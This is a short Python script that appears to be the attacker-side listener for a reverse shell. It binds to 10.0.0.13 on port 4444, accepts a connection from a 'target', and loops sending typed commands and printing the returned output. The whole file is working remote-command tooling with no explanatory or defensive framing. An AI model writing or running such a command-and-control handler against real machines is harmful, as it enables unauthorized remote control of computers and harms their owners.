import socket as sc

# Modify this
port = 4444
host = "10.0.0.13"

# Creating a Listener
server = sc.socket()
server.bind((host,port))
server.listen(1)
print(f"[+] Now listening on {host}:{port}")

# Accepting connection
target, rhost = server.accept()
print(f"[+] Connection was made by {rhost}")

# Running commands rapidly
while True:
    command = input("Enter a command : ").encode()
    target.send(command)
    print(f"The command '{command.decode()}' was sent !")
    output = target.recv(1024).decode()
    print(f"The output is : {output}")

